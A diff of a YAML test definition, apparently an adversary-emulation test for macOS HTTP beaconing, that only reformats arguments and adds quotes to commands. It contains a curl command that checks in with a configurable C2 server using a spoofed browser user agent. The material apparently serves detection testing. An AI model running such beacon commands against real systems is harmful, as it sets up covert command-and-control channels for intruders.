@@ -9,19 +9,19 @@ requirements:
     - os: darwin
 
 args:
-  - name: c2_url
+  c2_url:
     type: string
     description: C2 server HTTP URL
     default: "http://192.168.1.100:8080"
-  - name: beacon_interval
+  beacon_interval:
     type: integer
     description: Beacon check-in interval in seconds
     default: 60
-  - name: user_agent
+  user_agent:
     type: string
     description: Custom user agent for HTTP requests
     default: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
-  - name: beacon_path
+  beacon_path:
     type: string
     description: Beacon endpoint path
     default: "/api/checkin"
@@ -29,7 +29,7 @@ args:
 steps:
   - name: http_beacon_request
     description: Send HTTP beacon request to C2
-    command: curl -s -A "{{ user_agent }}" "{{ c2_url }}{{ beacon_path }}" -w "\nHTTP Status: %{http_code}\n"
+    command: "curl -s -A \"{{ user_agent }}\" \"{{ c2_url }}{{ beacon_path }}\" -w \"\\nHTTP Status: %{http_code}\\n\""
     type: command
   
   - name: beacon_with_data
@@ -53,7 +53,7 @@ test_type: dry_run
 cleanup:
   - name: clear_curl_cache
     description: Clear curl DNS cache
-    command: curl -s http://localhost:9999 2>/dev/null || true
+    command: "curl -s http://localhost:9999 2>/dev/null || true"
     type: command
     optional: true
 
